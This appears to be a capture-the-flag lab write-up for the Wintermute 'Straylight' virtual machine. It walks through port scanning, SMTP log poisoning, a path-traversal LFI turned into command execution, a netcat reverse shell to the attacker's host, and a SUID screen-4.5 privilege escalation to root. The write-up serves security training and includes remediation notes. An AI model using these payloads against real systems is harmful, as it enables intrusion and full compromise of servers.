## Version 1.4.1
## Language: en

Feature:
  Toe:
    wintermute
  Location:
    http://192.168.18.94/
  CWE:
    CWE-022: https://cwe.mitre.org/data/definitions/22.html
  Rule:
    Rule-123: https://docs.fluidattacks.com/criteria/vulnerabilities/123/
  Goal:
    Get remote connection and root privileges
  Recommendation:
    Validate that the parameters received by
    the application do not contain relative paths
    Disable insecure functions that allow
    reading of arbitrary files on the server

  Background:
  Hacker's software:
  | <Software name> | <Version>       |
  | parrot O.S      | 2022.2          |
  | Virtualbox      | 6.1.16          |
  | Google Chrome   | 104.0.5112.101  |
  | Nast V.         | 0.2.0           | 
  | Nmap            | 7.92            |
  | Netcat          | v1.10-46        |
  | Python          | 3.10            |
  | Wget            | 1.21            |
  
  Toe information:
    Given I am running the "Wintermute-Straylight-beta.ova" virtual machine Virtualbox

  Scenario: Dynamic detection
    Then I scan my network and search IP to machine Straylight

    """
	 sudo nast -m ens33
    """
    And see connected devices
    When I see the ip of the victim machine [dkb4rb] (1.png)
    Then I try scanning the open ports
 
    """
	 sudo nmap -p- --open -sCV --min-rate 5000 -Pn 192.168.18.94 > scann 
    """
    Then I see that ports 25, 80, 3000 are open [dkb4rb] (02.png)
	and other evidence is the file [dkb4rb / nmap] (scann)
    
    """
    """
    Here we see that there is a web application in port 80 http that gives us a little information on what to do. [ dkb4rb ] (3.png)
    We continue looking for port 3000 and we see an administration panel that tells us that it has default passwords. [ dkb4rb ] (4.png)

 Scenario: Exploitation
    Here we enter an administration panel where we see some directories
        that are available which are:  [ dkb4rb ] (5.png)

	"/fresside" where there is not much to see just a background image. [ dkb4rb ] (6.png)

	"/turing-bolo" where we see that we can select several use cases 
		but at this time we use the one called case. [ dkb4rb ] (7.png)

    when we enter est we see that there is a potential LFI exploitation vector. [ dkb4rb ] (8.png)

    We also see that he tells us about some mail logs which can be used to make an SMTP poisoning. [ dkb4rb ] (9.png)

    but first we will try to see if there are any parameters in the url that can be used to make 
	    arbitrary remote code execute. [ dkb4rb ] (10.png)

	but it does not work so we proceed to do the SMTP poisoning, to establish a new variable that
		allows us to execute code. [ dkb4rb ]  (11.png)
    
    """
     nc -nv 192.168.18.94 25
    """
    Ok after establishing this we see that we can already do the remote code execution. [ dkb4rb ] (12.png)

    """
     http://192.168.18.94//turing-bolo/bolo.php?bolo=../../../../../var/log/mail&cmd=ifconfig
    """
    then I see the output of the command, this is working. [ dkb4rb ] (13.png)

    """
     nc -lvp 403
    """
	Then we will proceed to listen on port 403 to do the revershell. [dkb4rb] (14.png)

    """ 
    http://192.168.18.94//turing-bolo/bolo.php?bolo=../../../../../var/log/mail&cmd=nc%20192.168.18.93%20403%20-c%20/bin/bash
    """
	Since we are listening, we send the payload in the http service that the reverse shell will give us from the server our ip. [ dkb4rb ] (15.png)

    """
     id
    """
	As a result we see that we are inside the user "www-data". [ dkb4rb ] (16.png)

    """
     script /dev/null -c bash
     Ctrl + Z
     tty raw -echo;fg
	 reset
    """
	we do the "TTY" treatment [ dkb4rb ] (17.png)
	    
    """
     export TERM=xterm
     export SHELL=bash
    """
	we will export the environment variables to have a fully interactive console.
    
 Scenario: Privilege escalation 
	Now we proceed to search for a program that allows us to escalate privileges to the "root" user.
	
	"""
	find / -perm -u=s -type f 2>/dev/null
	"""
	Here we see that the screen-4.5 program can be executed by us and is a potential way to escalate privileges. [ dkb4rb ] (18.png)
		

	For this there are exploits already elaborated, but since we like to know how everything works at a low level
		we will have one similar to these. [ dkb4rb/exploits ] (PrivShell.sh)

    """
     python3 -m http.server 8000
    """
	we proceed to share the script with the help of the simple "python3" http server through port 8000. [ dkb4rb ] (19.png

    """
     wget http://192.168.18.93:8000/PrivShell.sh
    """
	Now we download the program with the help of "Wget". [ dkb4rb ] (20.png)	

    """
     chmod +x PrivShell.sh
    """
	We proceed to give execution permissions to the program. [ dkb4rb ] (21.png)	

	"""
	 ./PrivShell.sh
	"""
	we execute the script [ dkb4rb ] (22.png)

	"""
	 cd /root
	"""
	We navigate to the root user directory and there we will see the flag.
	
	"""
	 cat flag.txt
	"""
	we see the flag. [ dkb4rb ] (23.png)
	
  Scenario: Remediation
    Given that the service is vulnerable to LFI
    Then it is necessary to apply code sanitization

  Scenario: Scoring
    Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    8.0/10 (High) - AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H
  Temporal: Attributes that measure the exploit's popularity and fixability
    7.5/10 (High) - E:F/RL:T/RC:C
  Environmental: Unique and relevant attributes to a specific user environment
    7.5/10 (High) - CR:H/IR:H/AR:H/MAV:N/MAC:H/MPR:H/MS:C/MC:H/MI:H/MA:H

  Scenario: Correlations
    No correlations have been found to this date 2022-08-31
